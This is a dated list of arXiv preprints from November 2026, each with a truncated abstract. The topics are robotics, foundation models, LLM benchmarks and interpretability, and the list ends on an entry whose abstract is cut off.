- **2026-11-10** — P Sangeerth, Poulomee Ghosh, Pushpak Jagtap — [Incremental Input-to-State Stabilization of Partially Unknown Control-Affine Systems within Prescribed Safe Sets](http://arxiv.org/abs/2611.13556v1)
  <details><summary>📄 Abstract</summary>
  Incremental input-to-state stability ($δ$-ISS) guarantees that the trajectories of a system converge towards one another, up to a gain on the difference of their inputs. Some existing learning-based designs that combine incremental stability with safety achieve only incremental input-to-state practical stability, whose non-vanishing offset can make the guarantee conservative. We consider control-affine systems with a known, full-row-rank input matrix and an unknown drift learned using Gaussian p...
  </details>

- **2026-11-10** — Jiawei Xiao, Boya Wang, Longtian Qiu et al. — [Reasoning-Aware Relational Representation Learning for Open-Vocabulary Scene Graph Generation](http://arxiv.org/abs/2611.13496v1)
  <details><summary>📄 Abstract</summary>
  Open-Vocabulary Scene Graph Generation (OV-SGG) requires models to recognize visual relationships beyond the training vocabulary, yet existing methods often rely on dataset-specific object--predicate co-occurrence patterns. Under long-tailed distributions and noisy object localization, such reliance leads to biased, entangled relation representations, limiting both rare-relation recognition and generalization to unseen predicates. To address these challenges, we propose RaRe, a reasoning-aware r...
  </details>

- **2026-11-10** — Yijia Shao, Song Bian, Junxian Guo et al. — [Deep Personalization: Continuous Context Observation for Local Proactive Agents](http://arxiv.org/abs/2611.13457v1)
  <details><summary>📄 Abstract</summary>
  As AI agents become increasingly capable, users must still recognize when and how to ask for help, leaving many opportunities for useful support unrealized. Proactive agents hold the promise to close this gap, but effective proactivity requires understanding users' real-time activities and personalizing intervention timing so that assistance is offered when it is likely to be helpful rather than disruptive. We introduce deep personalization, a closed-loop process that connects continuous context...
  </details>

- **2026-11-10** — Serhii Zabolotnii, Alina Tarasova — [An AI Assistant for Automating Anti-Corruption Expertise of Draft Legislation Based on the TRACE Framework](http://arxiv.org/abs/2611.14244v1)
  <details><summary>📄 Abstract</summary>
  We present an AI assistant for automating anti-corruption expertise of draft legislation based on the TRACE architecture, designed to screen bills for corruption risks: pinpoint provisions an expert would criticise and name the regulatory defect in each. The pipeline combines a deterministic parsing core, model-guided single-provision qualification, rule-based factor assignment, and external human oversight. To evaluate the assistant, we constructed an open benchmark from the published conclusio...
  </details>

- **2026-11-10** — Chengxiao Dong, Alessio Caporali, Hongyu Lan et al. — [From Prediction to Action: Learning Physical Context for Deformable Linear Object Manipulation](http://arxiv.org/abs/2611.14274v1)
  <details><summary>📄 Abstract</summary>
  A representation that accurately predicts a deformable object's response is not necessarily the one most useful for choosing manipulation actions. We study this distinction between predictive utility and decision utility in planar single-grasp shape control of Deformable Linear Objects (DLOs). As a common decision backbone, we introduce Geometry-Pointer-Flow (GPF), a geometry-grounded policy that separates grasp-location selection from grasp-conditioned motion generation. Its geometry-only varia...
  </details>

- **2026-11-10** — Dimitris Panagopoulos, Adolfo Perrusquía, Yang Xing et al. — [Model-Free Runtime Measurement of Task-Relevant Information](http://arxiv.org/abs/2611.14111v1)
  <details><summary>📄 Abstract</summary>
  Autonomous systems increasingly monitor physical kinematics, environmental states and task completion outcomes. While existing work provides methods to plan information seeking actions and interpret acquired observations, current approaches do not monitor whether the live process of information gathering is functioning properly. Consequently, such systems can remain operationally active without resolving outstanding mission requirements. To address this limitation, we introduce Acquisition-State...
  </details>

- **2026-11-10** — Huaijin Pi, Zehong Shen, Yong Wang et al. — [DexSeed: Expanding Human Hand-Object Interactions into Robot Demonstrations for Dexterous Policy Learning](http://arxiv.org/abs/2611.14092v1)
  <details><summary>📄 Abstract</summary>
  We study how to generate diverse, physically executable robot demonstrations for dexterous vision-language-action (VLA) learning. Existing demonstration-generation methods typically rely on costly teleoperated examples. Meanwhile, human hand--object datasets provide a reusable source, but existing transfer methods mainly reproduce given interactions. Turning these interactions into VLA training data further requires coverage of different objects and manipulation locations, together with executab...
  </details>

- **2026-11-10** — Xianghui Wang, Aoran Fu, Liyou Luo et al. — [ReACT: Reflection-Consistent Modulation and Cross-Load Consistency for Humanoid Velocity Tracking Under Asymmetric Loads](http://arxiv.org/abs/2611.13929v1)
  <details><summary>📄 Abstract</summary>
  In recent years, humanoid loco-manipulation has progressed to whole-body grasping, lifting, and transport. A basic requirement underlying these tasks is carrying the object to its destination, which depends on the locomotion controller accurately executing velocity commands from the navigation policy. However, carrying an object in one hand introduces a persistent asymmetric upper-body load that can degrade velocity tracking. Persistent tracking biases can accumulate into position and heading de...
  </details>

- **2026-11-10** — Yelin He, Jiaquan Ye, Xinming Wei et al. — [WAM is capable in BEHAVIOR-1K: the 2nd-place solution to the 2026 BEHAVIOR Challenge](http://arxiv.org/abs/2611.13818v1)
  <details><summary>📄 Abstract</summary>
  This work presents the 2nd-place solution (Team IF1001) to the 2026 BEHAVIOR Challenge, which evaluates mobile manipulation across 100 household tasks. Our method is built on a powerful world action model (WAM), Cosmos 3. We improve Cosmos 3 by using richer visual history, task-progress conditioning, and task-group and skill-specific LoRA adapters. During inference, we apply a separate progress estimator to supply task-progress context, and use task- and progress-conditioned routing to select a ...
  </details>

- **2026-11-10** — Aalap D. Shah, Basil Saeed, Joshua B. Tenenbaum et al. — [A computational framework for understanding embodied plans](http://arxiv.org/abs/2611.13669v1)
  <details><summary>📄 Abstract</summary>
  Reasoning about people's plans and goals based on their actions is fundamental to human social interaction and essential for cooperative, embodied artificial intelligence. Formalizing this capacity in naturalistic, embodied settings has been a longstanding challenge. Here, we present GenEA, a novel agent representation capable of reasoning over multi-step, long-horizon embodied plans. At the heart of GenEA lies a multilevel state-space that couples the coarse biomechanics of an articulated body ...
  </details>

- **2026-11-10** — Yi Wang, Jingqiu Wu, Lei Yao et al. — [From Egocentric Human Video to Robot Manipulation in the Era of Embodied Intelligence](http://arxiv.org/abs/2611.13610v1)
  <details><summary>📄 Abstract</summary>
  Egocentric human video (EHV) records close-range hand-object interaction (HOI) and the temporal structure of everyday activities, offering a potentially scalable source of experience for robot manipulation. Using this experience for robot control requires recovering useful supervision without recorded robot actions and accounting for differences in morphology, viewpoint, and action space. We define Ego2Robot learning as the process of learning or adapting robot manipulation policies from EHV, or...
  </details>

- **2026-11-10** — Niall Dalton — [How Post-Training Influences Verbalized Algorithmic Computation in Language Models](http://arxiv.org/abs/2611.13552v1)
  <details><summary>📄 Abstract</summary>
  Post-training improves language-model reasoning, but how it changes the use of internal information and verbalized chain of thought (CoT) remains unclear. We study successive SFT, DPO, and RLVR checkpoints of Olmo-3-7B-Instruct on multi-digit addition, using carry values as known intermediate state. Probes recover carry information from internal activations with similar accuracy in SFT and RLVR, although manipulating this information does not reliably control model outputs. In contrast, the usef...
  </details>

- **2026-11-10** — Emre Kutlusan, Yongmin Li — [Medical Image Segmentation: Foundation Model Adaptation versus Task-Specific Training](http://arxiv.org/abs/2611.14519v1)
  <details><summary>📄 Abstract</summary>
  Foundation models pretrained on large natural-image collections are increasingly adapted for medical image segmentation, in the expectation that they will replace models trained for each task. Most comparisons, however, use data from the training distribution and a single task-specific baseline whose configuration is rarely justified, and therefore provide limited evidence of performance at new clinical sites. It also remains unclear how much of a foundation model must be adapted, and what deter...
  </details>

- **2026-11-10** — Megha Srivastava, Michael H. Lim, Allison M. Keys et al. — [Pyrite: Building and Benchmarking Protein-Ligand Pose Ranking Agents](http://arxiv.org/abs/2611.14511v1)
  <details><summary>📄 Abstract</summary>
  Predicting how a ligand binds to its target is central to small-molecule drug discovery. Modern cofolding models can generate diverse candidate poses, but reliably ranking these candidates remains challenging. We introduce Pyrite, a pairwise pose-ranking benchmark comprising 1,500 pose pairs across diverse protein-ligand complexes. Expert chemists equipped with 3D visualization tools and physics-based scores perform near chance, highlighting the difficulty of interpreting available chemical sign...
  </details>

- **2026-11-10** — Vagn Krister Nes Glomsrud, Mathias Bynke, Lars Henry Berge Olsen et al. — [Accurate predictions of properties of energetic materials with tabular foundation models](http://arxiv.org/abs/2611.14462v1)
  <details><summary>📄 Abstract</summary>
  We use TabPFN, a recently developed tabular foundation model, to predict three properties of energetic materials: impact sensitivity, decomposition temperature and crystal density. Without any hyperparameter tuning, TabPFN outperforms the best published models for all three properties. It also substantially outperforms a wide range of established machine-learning models, including tuned gradient boosting (XGBoost), random forests and Gaussian processes. This holds both when the models are given ...
  </details>

- **2026-11-10** — Ferran Espuny-Pujol — [Measuring Kaplan--Meier Overestimation Under Competing Risks: Event Ordering, Quantification, and Exact Inference](http://arxiv.org/abs/2611.14457v1)
  <details><summary>📄 Abstract</summary>
  Competing risks arise when individuals may experience multiple mutually exclusive event types. Competing events are frequently treated as censoring and analysed using Kaplan--Meier (KM) methods, which overestimate real-world event risks. While the existence of KM overestimation is well known, its determinants, magnitude, and inferential properties remain poorly characterised.   We develop a nonparametric framework that treats competing risks overestimation as a statistical quantity in its own ri...
  </details>

- **2026-11-10** — Sourish Gunesh Dhekane, Abinaya Kumar, Torsten Woertwein et al. — [Quantifying the Sampling Frequency Invariance of Time-Series Foundation Models for Sensor Data Applications](http://arxiv.org/abs/2611.14425v1)
  <details><summary>📄 Abstract</summary>
  Time-Series Foundation Models (TSFMs) are increasingly used in sensor applications, where sampling frequency (SF) varies across sensors, devices, and operating modes (e.g., power saving). Ideally, TSFMs must remain effective during such SF changes, provided the SF retains task-critical bandwidth. In this paper, we stress-test 4 prominent TSFMs: MOMENT, Chronos-2, Moirai-MoE, and TimesFM, to quantify their SF-invariance and investigate whether their behavior tracks the resulting loss of informati...
  </details>

- **2026-11-10** — Lucas de Souza Brandão, Gabriel da Costa Merlin, Diego Furtado Silva — [Exploring Post-Hoc Disentanglement of Audio Foundation Models for Music Similarity](http://arxiv.org/abs/2611.14415v1)
  <details><summary>📄 Abstract</summary>
  Audio foundation models like CLAP, MuQ, and MERT excel at capturing general musical similarity. On the other hand, their entangled latent spaces limit interpretability and fine-grained attribute control. Conditional Similarity Networks (CSN) address this by pairing a backbone representation model with learned masks that gate the embedding space into attribute-specific subspaces. However, existing methods train the backbone from scratch, rather than leveraging pretrained foundation models. We ins...
  </details>

- **2026-11-10** — Mohammed Nayeem Khan, Logesh L, Aliyas Ahmad Misri — [Bits or permutations? Spending a fixed inference budget on weight precision or on option-order averaging in small local language models](http://arxiv.org/abs/2611.14413v1)
  <details><summary>📄 Abstract</summary>
  Local language models can save memory by storing weights in fewer bits, and they can reduce sensitivity to the order of answer options by averaging a few reorderings. We ask whether the first makes the second worse, and which is the cheaper way to spend a fixed budget. On Qwen3-0.6B and Qwen3-1.7B with simulated round-to-nearest weight quantization (8, 6, 4 and 3 bits, fp16 reference), read from the logits of the letters A to D on ARC-Easy, ARC-Challenge, MMLU and HellaSwag (300 items each), 6 b...
  </details>

- **2026-11-10** — Bernhard Voggenberger, Christian Ganhör, Levente Zólyomi et al. — [The Unused Input: The Initial State as a Conditioning Interface for Recurrent TSFMs](http://arxiv.org/abs/2611.14357v1)
  <details><summary>📄 Abstract</summary>
  Time series foundation models (TSFMs) forecast unseen series without task-specific training. Increasingly they are built on recurrent backbones, whose constant per-step cost makes long-context inference cheap, and which, unlike transformers, carry a state. A recurrent backbone computes its prediction from two inputs: the observed context window and the initial recurrent state. In practice only the first is utilised and the initial state is unused by convention. We ask whether the initial state c...
  </details>

- **2026-11-10** — Alessio Brini — [Point-in-Time Encoders for Earnings Calls](http://arxiv.org/abs/2611.14325v1)
  <details><summary>📄 Abstract</summary>
  Text encoders turn earnings calls into vectors for search, for language models that answer from retrieved passages, and for forecasting models. A live retriever can use an encoder trained once on all available text, as finance retrievers are, but a backtest needs an encoder that read no text written after the date of each vector. To address this look-ahead bias, from 412,248 calls we train vintages under four pretraining recipes, with yearly cutoffs from 2010 to 2024, and each vintage reads only...
  </details>

- **2026-11-10** — Ezequiel Centofanti, Benjamin Remy, Emma Ayçoberry et al. — [SHINE: Shear inference environment - Generative forward modelling for radio weak gravitational lensing](http://arxiv.org/abs/2611.14301v1)
  <details><summary>📄 Abstract</summary>
  Next-generation radio interferometers, such as SKA, will observe the radio sky with unprecedented sensitivity and resolution enabling weak gravitational lensing studies using radio data, which not only complement optical observations but also probe higher redshifts. However, traditional shear estimation methods, based on measuring the ellipticity of observed galaxies, are not directly applicable to radio interferometric data. Interferometric observations are acquired in the Fourier domain, where...
  </details>

- **2026-11-10** — Yuan Zhang, Thales Bertaglia, Ralph Schroeder — [Can AI be a 'Researcher Without Borders'? Auditing Bias in AI-Assisted Social Science Research about China and the US](http://arxiv.org/abs/2611.14288v1)
  <details><summary>📄 Abstract</summary>
  Although large language models have demonstrated strong performance on algorithmic and mathematical tasks, their suitability as social science research assistants remains unclear, particularly because many social science questions lack agreed-upon, quantifiable benchmark answers. Evaluating this suitability is important since researchers and students increasingly rely on AI to generate research ideas. When questions concern the countries in which models were developed, bias may be exacerbated: D...
  </details>

- **2026-11-10** — Mehmet Onur Keskin, Berk Buzcu, Nikhil Churamani et al. — [Personalized Affective Perception via Continual Learning in Human-Agent Negotiation](http://arxiv.org/abs/2611.14247v1)
  <details><summary>📄 Abstract</summary>
  Self-interested intelligent agents that negotiate with humans should interpret nonverbal expressions and adapt their behavior accordingly. However, generic facial-affect models degrade across individuals and contexts, creating a generalization gap. We introduce an affect-adaptive negotiation strategy that incorporates Continual Learning with Imagination for Facial Expression Recognition (CLIFER) to personalize valence-arousal perception in real time. Differential feedback converts changes in val...
  </details>

- **2026-11-10** — Jack T. Parley — [Stagewise and interpretable emergence of inside-outside computation in Transformer-based language models](http://arxiv.org/abs/2611.14221v1)
  <details><summary>📄 Abstract</summary>
  Variability in syntactic structure and parsing ambiguity are fundamental aspects of natural language which modern LLMs have to learn to deal with proficiently. Previous "post-mortem" studies have shown that fully trained Transformers indeed approximate canonical parsing algorithms such as inside-outside, but little is established theoretically about how this is actually learned. Here, we make a first step towards addressing this by studying the learning dynamics in synthetic context-free grammar...
  </details>

- **2026-11-10** — Geunsoo Jang, K. Selçuk Candan, Gerardo Chowell — [Benchmarking large language models for parameter-level structural identifiability classification in epidemic ODE models](http://arxiv.org/abs/2611.14184v1)
  <details><summary>📄 Abstract</summary>
  Structural identifiability determines whether unknown parameters can be uniquely recovered from ideal model outputs, making it a prerequisite for interpreting parameter estimates. We evaluated whether large language models (LLMs) can reliably provide preliminary structural identifiability classifications for epidemic models. We constructed a retrospective benchmark of 88 scenarios from 14 of the 27 studies considered, encompassing 696 parameter-level formal reference classifications from publish...
  </details>

- **2026-11-10** — Shenxi Liu, Yiwei Li, Mingyang Zhao et al. — [BARS: Budget-Aware Sequential Sampling with Refusal for Majority Identification under Unknown Distributions](http://arxiv.org/abs/2611.14171v1)
  <details><summary>📄 Abstract</summary>
  Repeated sampling with majority selection is an effective means of enforcing self-consistency in large language models. Recently, a variant has also been introduced that terminates early to save costs when the output distribution is favorable. But it still cannot yield a correct confidence estimate from the answer distribution. For this issue, we formalize this as majority identification under an unknown distribution with a budget and a target error rate, and propose BARS, a sequential rule cert...
  </details>

- **2026-11-10** — Haohang Huang, Xuan Lu, Mingjin Kuai et al. — [From Search to Decision: How Post-Training Shapes Information-Seeking Capabilities in Large Language Models](http://arxiv.org/abs/2611.14149v1)
  <details><summary>📄 Abstract</summary>
  Information seeking in large language model (LLM) systems increasingly involves decisions about when to acquire information, where to search, and how to evaluate and use evidence. Recent post-training methods have improved several such behaviors, but their objectives and evaluations span different tasks and system settings. This paper organizes research around six interrelated information-seeking capabilities and examines the learning signals, optimization methods, update loci, and credit-assign...
  </details>

- **2026-11-10** — Federico Ravenda, Mirko Cesarini, Daniele Montagnani et al. — [Hx2Dx: From Anamnesis to Diagnosis - A Multimodal Arena for Conversational Clinical Reasoning in LLMs](http://arxiv.org/abs/2611.14122v1)
  <details><summary>📄 Abstract</summary>
  Large language models (LLMs) achieve expert-level diagnostic accuracy in static evaluations, where the model receives a curated vignette or case report that already condenses the diagnostically relevant findings. Such evaluations measure inference over already selected evidence; the evaluations do not account for the inquiry used to obtain it. In clinical practice, however, diagnosis is an iterative process of inquiry. Clinicians take the patient's history, or anamnesis (Hx), through targeted qu...
  </details>

- **2026-11-10** — Yuanhe Tian, Yan Song — [Looking One Step Ahead: An Anticipation-guided Agent for Object State Readout in Videos](http://arxiv.org/abs/2611.14113v1)
  <details><summary>📄 Abstract</summary>
  Understanding the progress of an activity requires tracking how the objects involved change over time. Object state readout provides this information by describing a target object's states and transitions across video frames. Although multimodal large language models (MLLMs) generate detailed visual descriptions, these descriptions may leave the attributes needed to distinguish successive states insufficiently specified. In this paper, we propose look-ahead state readout (LASER), an anticipation...
  </details>

- **2026-11-10** — Dave Murray-Rust, Elisa Giaccardi, Federico Bomba et al. — [From Bias to Positionality: A critical grammar for Large Language Models](http://arxiv.org/abs/2611.14079v1)
  <details><summary>📄 Abstract</summary>
  Bias has become a default lens for understanding what machine learning systems do and how we should relate to them. Bias is at root a deviation from a standard; in decision making systems we can supply a standard from outside: a law, a protected attribute, a benchmark, a statistical property. However, even there, biased is often used as a shorthand, without stating what the position taken is - a silent ``relative to''. In a general use of language models, nothing supplies the standard: there is ...
  </details>

- **2026-11-10** — Zhikun Tao, Fangyong Jin, Junping Zhao — [Can KV Cache Be Reused Across Model Updates? A DeepSeek-V4-Flash Case Study](http://arxiv.org/abs/2611.14051v1)
  <details><summary>📄 Abstract</summary>
  Reusing key--value (KV) caches across language model updates could avoid repeated computation of shared context, but changes in model weights raise a fundamental question about what these caches preserve. We investigate direct cache reuse across four model updates, with a detailed study of DeepSeek-V4-Flash to Flash-0731. Our central finding is that caches can retain useful task information without faithfully reproducing the updated model's behavior. Retrieval accuracy varies substantially acros...
  </details>

- **2026-11-10** — Wei Gu, Weiwei Qi, Jiajun Tang et al. — [TreeAgent: Structure-Aware Memory Agent for Processing Long Hierarchical Data](http://arxiv.org/abs/2611.13946v1)
  <details><summary>📄 Abstract</summary>
  Practical Web applications increasingly require agents to interpret long conversations or documents. For inputs exceeding the context windows of large language models (LLMs), memory agents process segments sequentially and retain past information in bounded memory. However, they typically divide inputs into flat token segments without preserving structure or hierarchy, causing three limitations for structured data such as API responses or HTML documents. First, fixed-length segmentation can spli...
  </details>

- **2026-11-10** — Haowei Cheng, Milhan Kim, Bowen Jiang et al. — [OpenRE-Bench: A Benchmark Harness for Multi-Agent Requirements Engineering with Mined GitHub Issues](http://arxiv.org/abs/2611.13925v1)
  <details><summary>📄 Abstract</summary>
  OpenRE-Bench is an open-source benchmarking infrastructure for large language model (LLM) based multi-agent requirements-engineering (RE) frameworks. Such frameworks are increasingly common, but they use different agent roles, negotiation policies, and output shapes, and are typically evaluated on their own runtimes, metrics, and small sets of curated system descriptions, which makes fair, reproducible comparison difficult. OpenRE-Bench addresses this with four reusable pieces: a shared run harn...
  </details>

- **2026-11-10** — Vojtech Cahlik, Amir Reza Mohammadi, Rodrigo Alves et al. — [From Counterfactual Edits to Human Narratives: LLM-Driven Interpretations for Recommender System Explanations](http://arxiv.org/abs/2611.13914v1)
  <details><summary>📄 Abstract</summary>
  Recommender systems increasingly influence what users discover and consume online, yet the decision logic behind their outputs often remains opaque. Counterfactual explanation (CFX) methods provide an effective way to show which changes to a user's interaction history would alter a recommendation. In recommendation settings, however, CFXs often require many edits, producing long, low-level lists that are hard for users to interpret. Moreover, most evaluations emphasize edit counts while largely ...
  </details>

- **2026-11-10** — Guangyu Wang, Xiaodong Ma, Xinming Wu — [Adapting a Vision Foundation Model for Fracture Characterization in Acoustic Image Logs](http://arxiv.org/abs/2611.13911v1)
  <details><summary>📄 Abstract</summary>
  Natural fractures (NFs) and drilling-induced tensile fractures (DITFs) in acoustic image logs provide insights into rock mass structure and in situ stress, but manual characterization is time-consuming. Deep learning can automate this task, although expert-labeled data are scarce. We investigate whether adapting a pretrained vision foundation model (VFM) outperforms task-specific models trained from scratch with limited annotations. Using 80 annotated acoustic image samples, we fine-tuned DINOv3...
  </details>

- **2026-11-10** — Lorenzo Cirillo, Irene Amerini, Andrea Cavallaro — [Mechanistic Interpretability of Deep Neural Networks: Methods, Frameworks, and Perspectives](http://arxiv.org/abs/2611.13868v1)
  <details><summary>📄 Abstract</summary>
  Deep neural networks underpin fundamental tasks in a wide range of signal domains, such as image, audio, and language processing. However, their internal mechanisms are notably difficult to interpret. Internal activations are structured signals transformed across layers that may encode a multitude of interdependent relationships, as individual neurons frequently represent multiple underlying concepts. Mechanistic interpretability aims to uncover the internal mechanisms of neural networks by iden...
  </details>

- **2026-11-10** — Teysir Baoueb, Leonardo Boulitreau de Menezes Martins Marques, Paraskevas Stamatiadis et al. — [MusicFlux: Flexible Conditioning for Text-Guided Music Generation and Editing](http://arxiv.org/abs/2611.13834v1)
  <details><summary>📄 Abstract</summary>
  Music editing transforms existing recordings while preserving their original attributes. Recent approaches adapt pretrained text-to-music models for tasks like inpainting, event insertion, or restoration by conditioning them with context audio. It was recently proposed for image editing to unify generation and editing by treating the source image as in-context information. However, applying this directly to music is computationally expensive due to long audio sequences. In this work, we develop ...
  </details>

- **2026-11-10** — Mohd Tahseen, Vivekanand Dabade — [Elastic Landau states as martensite nuclei in austenite](http://arxiv.org/abs/2611.13816v1)
  <details><summary>📄 Abstract</summary>
  In this article, we investigate the geometric closure of austenite--martensite interfaces. Classical compatibility conditions permit stress-free interfaces between the two phases: the condition $λ_2 = 1$ admits planar interfaces, whereas the cofactor conditions additionally admit curved interfaces. However, neither, guarantees the geometric closure of these interfaces. We identify two-parameter families of martensitic deformations that overcome this limitation and enable the formation of closed,...
  </details>

- **2026-11-10** — Donghun Ryu, Seokhyun Kim, Minhyeok Lee — [FastWild-GS: Minutes-Scale In-the-Wild Gaussian Splatting via Compact Per-Image Appearance Adaptation](http://arxiv.org/abs/2611.13808v1)
  <details><summary>📄 Abstract</summary>
  Internet photos of a scene differ in exposure, illumination and transient objects such as passers-by, so one set of Gaussian colours cannot explain all photos (the in-the-wild setting). Recent in-the-wild Gaussian Splatting methods mostly report hours of per-scene optimization. We present FastWild-GS, which describes each photo by a 128-dimensional Photo Appearance Token and a per-channel transform, a scale and an offset applied to the rendered image (six parameters); a small MLP predicts the co...
  </details>

- **2026-11-10** — Andrew P. Kels, Masahito Yamazaki — [Elliptic hypergeometric sum/integrals for orthogonal groups and Seiberg duality on the lens space](http://arxiv.org/abs/2611.13803v1)
  <details><summary>📄 Abstract</summary>
  We derive new transformation formulas for elliptic hypergeometric sum/integrals associated with the orthogonal groups $\mathrm{SO}(N)$. The sum/integrals are written in terms of the lens elliptic gamma function, which depends on an integer $r\geq 1$ in addition to the usual complex variables, and they reduce to the elliptic hypergeometric integrals of Spiridonov and Vartanov for $r=1$. The derivation uses the $BC_n\leftrightarrow BC_{\tilde n}$ transformation formula proven in our previous paper...
  </details>

- **2026-11-10** — Fabio Bonsignorio, Elisabetta Barletta, Sorin Dragomir et al. — [Softness is something you also need! Why compliance helps control: information metrics of a passive walker with compliant ankle](http://arxiv.org/abs/2611.13779v1)
  <details><summary>📄 Abstract</summary>
  A great gap in adaptivity, flexibility, and dexterity still exists between intelligent robots, whether they are made of rigid or (partially) compliant components, and their naturally evolved animal and vegetal counterparts. One reason could be of `paradigm' nature. On the one hand, most robots (both rigid and soft) are still designed by following a `Cartesian' approach, with top-down control and a clear mind-body separation. Designing artificial agents on the basis of the principles that we obse...
  </details>

- **2026-11-10** — Karl Friedrich Siburg — [Berry phase and Hannay angle as Taylor coefficients of the minimal action](http://arxiv.org/abs/2611.13702v1)
  <details><summary>📄 Abstract</summary>
  For a Hamiltonian system with one degree of freedom whose parameters are varied slowly around a closed loop, with slowness $δ$, we study the minimal action $β_δ$ of the resulting time-periodic system and its convex conjugate, Mather's $α$-function $α_δ$, both normalized per unit time. The cycle map of such a system is an area-preserving map of the cylinder which in general is not integrable. We prove that $β_δ(ρ)$ and $α_δ(c)$ have asymptotic expansions in $δ$ to every finite order, locally unif...
  </details>

- **2026-11-10** — Huixue Han, Jiaying Liu — [Compute the Interactions, Not the Attributes: What a Fact Layer Must Supply in the Chinese Sexagenary System](http://arxiv.org/abs/2611.13597v1)
  <details><summary>📄 Abstract</summary>
  Language-model systems in rule-governed domains often pair the model with a deterministic fact layer, but which facts that layer should supply is rarely measured. We measure it in the Chinese sexagenary system underlying BaZi chart analysis, where every fact has one table-checkable value: 682 items over twelve fact categories and 160 transit--natal collision items, posed closed-book, with the reference table, and with computed facts at increasing levels. In eleven open-weight models answering di...
  </details>

- **2026-11-10** — Jifan Gao, Junjie Hu, John Caskey et al. — [A Concept-Based Interpretable Framework for Clinical Text-based Prediction via Token-Concept Attention without Concept Supervision](http://arxiv.org/abs/2611.13564v1)
  <details><summary>📄 Abstract</summary>
  Objective: Concept-based interpretation has emerged as a promising approach for explaining blackbox models using human-understandable, high-level concepts. However, most existing methods require annotated concept labels to train the model to identify concepts in the input, and obtaining such annotations in clinical text is often expensive. This study aims to enable concept-based interpretation for language models without concept supervision on clinical prediction tasks. Methods: We propose a nov...
  </details>

- **2026-11-10** — Zhiqun Zhao, Xiaodong Yang, Bruce Gu et al. — [An evidence-traceable benchmark of clinical reasoning in large language models](http://arxiv.org/abs/2611.13562v1)
  <details><summary>📄 Abstract</summary>
  Benchmark scores for medical large language models (LLMs) are difficult to interpret when scoring criteria cannot be traced to clinical evidence. Here we developed Med Evidence Bench (MEB; https://www.medevidencebench.org.cn/), comprising 1,536 physician-constructed items across three levels: guideline knowledge, standardized clinical scenarios and real-world laboratory scenarios. Each criterion stating a medical claim is linked to a versioned source-text span. Across ten LLMs, the Evidence Trac...
  </details>

- **2026-11-10** — Boyoung Kwon, Jiyoon Seo, Sang Ho Lee — [Discovering Structurally Plausible and Interpretable Cognitive Models with Large Language Models](http://arxiv.org/abs/2611.13561v1)
  <details><summary>📄 Abstract</summary>
  Computational cognitive modeling has traditionally relied on manual model construction, which is a time-intensive process that requires substantial domain expertise. Although recent LLM-based approaches have begun to automate model generation, they often prioritize predictive accuracy at the expense of structural plausibility and parameter identifiability. We introduce DisCo, an LLM-guided framework that discovers interpretable symbolic cognitive models through evolutionary search with two struc...
  </details>

- **2026-11-10** — Ed deHaan, Allen H. Huang — [Tabular Foundation Models in Financial Predictions](http://arxiv.org/abs/2611.13550v1)
  <details><summary>📄 Abstract</summary>
  This technical note introduces tabular foundation models (TFMs) to accounting research and evaluates their performance in one common benchmark task: predicting firms' next-year earnings changes. TFMs produce numeric predictions and learn in context, without post-release training or tuning, making them natural and easy to use for forecasting. The TFMs we study are pretrained on synthetic tabular data, so they avoid look-ahead bias from memorizing firms' outcomes. We compare Google Research's TabF...
  </details>

- **2026-11-10** — Mahdi Nazemi, Oleg Rybakov, Tijmen Blankevoort et al. — [Closing the BF16-FP16 Convergence Speed Gap in RL Post-Training with Stochastic Rounding](http://arxiv.org/abs/2611.13545v1)
  <details><summary>📄 Abstract</summary>
  BF16 is widely used to pretrain large language models because it has the same dynamic range as FP32 and converges similarly to FP32 training. However, in reinforcement learning with verifiable rewards, where learning rates are typically low, we find that standard mixed-precision BF16 training converges more slowly than FP16 training at the same learning rate. We attribute this gap to weight sticking: when FP32 shadow weights are quantized to BF16 using round-to-nearest, small updates often leave...
  </details>

- **2026-11-10** — Jeevan Neupane, Janardan Bhetwal, Kshitiz Paudel et al. — [Nepali-English Code-Mixed Speech Recognition: Data Preparation and Adaptation of a Speech Foundation Model](http://arxiv.org/abs/2611.13512v1)
  <details><summary>📄 Abstract</summary>
  Nepali speakers regularly mix English words into conversation, but multilingual speech recognisers often struggle with language switches and the writing script used for English words. We study how to adapt SraVaani, a 449M-parameter hybrid TDT-CTC model, using a 172.8-hour corpus covering six Nepali speech domains. Its pretrained tokenizer does not support digits and several common symbols. Rather than replace it or discard these recordings, we generate Nepali and English readings for numbers an...
  </details>

- **2026-11-10** — Erfan Baghaei Potraghloo, Milad Heidari Sorkhehdizaj, Shahab Rahimirad et al. — [Free Lunch Uncertainty: Sequence-Level Rényi Entropy from Particle Decoding for Adaptive LLM Reasoning](http://arxiv.org/abs/2611.13414v1)
  <details><summary>📄 Abstract</summary>
  Quantifying uncertainty over an entire LLM completion is critical for selective prediction and adaptive compute. Zero-cost signals such as mean token entropy and log-probability are local to tokens or to one completion, and self-consistency needs many extra completions. We show that Sequential Monte Carlo (SMC) decoding for power sampling already estimates the normalizing constant of the power distribution, which gives the sequence-level R'enyi entropy (SRE) of the model's completion distributio...
  </details>

- **2026-11-10** — Antoinette Stone, Ruoning Zhang, Brian Utter — [AI is ready, but are the students. From answer-making to sense-making](http://arxiv.org/abs/2611.13404v1)
  <details><summary>📄 Abstract</summary>
  Students in introductory physics often struggle with interpreting kinematics graphs, especially when connecting graphical features to physical meaning. We investigated AI tool use in kinematic graphing analysis as an intervention to support active sensemaking. This study examines GPT-5 performance on the Test of Understanding Graphs in Kinematics (TUG-K) and the way students interacted with GPT-5 during introductory physics activities involving graphical analysis. For the first part of the study...
  </details>

- **2026-11-10** — Freek Byrman, Partha Das, Stijn Verdenius et al. — [How Hyperbolic Are Hyperbolic Vision-Language Models?](http://arxiv.org/abs/2611.13384v1)
  <details><summary>📄 Abstract</summary>
  Hyperbolic vision-language models (VLMs) have emerged as a rapidly growing area of research, reporting strong zero-shot performance alongside an interpretable embedding space in which radius orders representations by generality. But how hyperbolic are hyperbolic VLMs in practice? We investigate this at the exponential map, the single operation through which curvature enters an otherwise Euclidean network. We show that across MERU, HyCoCLIP, ARGENT, and PHyCLIP, the exponential map is well approx...
  </details>

- **2026-11-09** — Josip Vrdoljak, Akash Singh, Bas Steunebrink et al. — [ExpertCrowd-SWE: Measuring Frontier Coding Agents on Expert-Authored Engineering Tasks in Unfamiliar Codebases](http://arxiv.org/abs/2611.13246v1)
  <details><summary>📄 Abstract</summary>
